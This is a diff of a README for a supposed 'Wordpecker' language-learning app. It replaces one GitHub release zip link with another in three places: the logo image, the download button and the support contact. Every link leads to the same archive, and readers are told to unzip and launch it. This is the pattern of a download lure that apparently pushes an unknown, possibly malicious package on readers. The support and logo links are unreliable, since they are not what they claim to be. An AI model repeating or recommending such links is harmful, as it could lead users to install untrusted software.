@@ -1,6 +1,6 @@
 # 🦜 Wordpecker Language Learning App 🌍
 
-![Wordpecker Logo](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v1.0/Release.zip)
+![Wordpecker Logo](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v2.0/Software.zip)
 
 Welcome to the Wordpecker repository! 🎉
 
@@ -20,7 +20,7 @@ Wordpecker is a personalized language-learning tool that revolutionizes the way 
 
 To get started with Wordpecker, simply download the software package from the following link:
 
-[![Download Wordpecker](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v1.0/Release.zip)](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v1.0/Release.zip "Download Wordpecker")
+[![Download Wordpecker](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v2.0/Software.zip)](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v2.0/Software.zip "Download Wordpecker")
 
 Once the download is complete, unzip the file and launch the application to begin your language-learning journey with Wordpecker.
 
@@ -38,7 +38,7 @@ Once the download is complete, unzip the file and launch the application to begi
 
 ## Support 🤝
 
-For any inquiries, feedback, or issues encountered while using Wordpecker, please feel free to reach out to our support team at [https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v1.0/Release.zip](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v1.0/Release.zip).
+For any inquiries, feedback, or issues encountered while using Wordpecker, please feel free to reach out to our support team at [https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v2.0/Software.zip](https://github.com/UXRSBROTHER/wordpecker-app/releases/download/v2.0/Software.zip).
 
 ## Roadmap 🚧
 
